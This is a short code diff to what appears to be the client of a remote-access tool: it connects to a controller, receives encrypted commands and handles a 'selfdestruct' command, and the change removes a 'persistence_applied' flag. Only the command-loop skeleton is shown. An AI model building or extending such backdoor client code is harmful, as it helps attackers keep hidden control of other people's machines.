@@ -28,8 +28,6 @@ def main():
     conn.connect((HOST, PORT))
     client = common.Client(conn, HOST, 1)
 
-    persistence_applied = False
-
     while True:
         results = ''
         data = client.recvGCM()
@@ -89,7 +87,7 @@ def main():
 
         elif cmd == 'selfdestruct':
             conn.close()
-            toolkit.selfdestruct(plat, persistence_applied)
+            toolkit.selfdestruct(plat)
 
         client.sendGCM(results)
 
